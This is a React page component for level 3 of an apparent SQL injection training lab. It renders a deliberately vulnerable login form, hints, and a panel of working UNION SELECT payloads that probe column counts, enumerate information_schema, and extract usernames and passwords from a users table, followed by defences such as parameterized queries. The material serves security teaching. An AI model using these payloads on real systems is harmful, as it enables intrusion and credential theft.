'use client';

import LoginForm from '@/components/LoginForm';
import { LoginCredentials, ApiResponse } from '@/types';

export default function Level3() {
  const handleLogin = async (credentials: LoginCredentials): Promise<ApiResponse> => {
    try {
      const response = await fetch('/api/level3', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(credentials),
      });

      return await response.json();
    } catch (error) {
      return {
        success: false,
        error: 'Failed to connect to server'
      };
    }
  };

  const hints = [
    "This level is designed for UNION SELECT attacks",
    "First determine the number of columns in the original query",
    "Use ORDER BY to find the column count: ' ORDER BY 5--",
    "Try: ' UNION SELECT username, password, email, role, id FROM users--",
    "The original query selects: id, username, email, role, created_at"
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyber-dark via-gray-900 to-cyber-dark py-12">
      <div className="container mx-auto px-6">
        <LoginForm
          level={3}
          title="Union-based Injection"
          description="This level focuses on UNION SELECT attacks, which allow attackers to extract data from other tables by combining the results of multiple SELECT statements. You'll need to determine the structure of the original query first."
          onSubmit={handleLogin}
          hints={hints}
          isVulnerable={true}
        />

        {/* Technical Details */}
        <div className="mt-12 max-w-4xl mx-auto">
          <div className="vulnerability-card rounded-lg p-8">
            <h2 className="text-2xl font-semibold mb-6 text-cyber-blue">
              🔍 Technical Details
            </h2>
            
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">UNION Attack Methodology:</h3>
                <div className="code-block">
{`-- Step 1: Determine number of columns
' ORDER BY 1--  (success)
' ORDER BY 2--  (success)
' ORDER BY 5--  (success)
' ORDER BY 6--  (error - too many columns)

-- Step 2: Find which columns are displayed
' UNION SELECT 1,2,3,4,5--

-- Step 3: Extract sensitive data
' UNION SELECT username, password, email, role, id FROM users--
' UNION SELECT table_name, column_name, 1, 2, 3 FROM information_schema.columns--`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Requirements for UNION Attacks:</h3>
                <ul className="space-y-2 text-gray-300">
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Same number of columns in both SELECT statements
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Compatible data types in corresponding columns
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Knowledge of table and column names (or good guessing)
                  </li>
                  <li className="flex items-start">
                    <span className="text-cyber-blue mr-2">•</span>
                    Application must display the query results
                  </li>
                </ul>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Information Gathering Queries:</h3>
                <div className="code-block">
{`-- Database version and user
' UNION SELECT version(), user(), 3, 4, 5--

-- List all tables
' UNION SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables--

-- List columns for a specific table
' UNION SELECT column_name, data_type, 3, 4, 5 FROM information_schema.columns WHERE table_name='users'--

-- Extract passwords
' UNION SELECT username, password, 3, 4, 5 FROM users--`}
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-cyber-green mb-3">Defense Strategies:</h3>
                <div className="code-block">
{`// Use parameterized queries
const query = "SELECT id, username, email, role, created_at FROM users WHERE username = $1";

// Input validation
if (!/^[a-zA-Z0-9_]+$/.test(username)) {
  throw new Error('Invalid username format');
}

// Whitelist allowed characters
const sanitized = username.replace(/[^a-zA-Z0-9_]/g, '');`}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
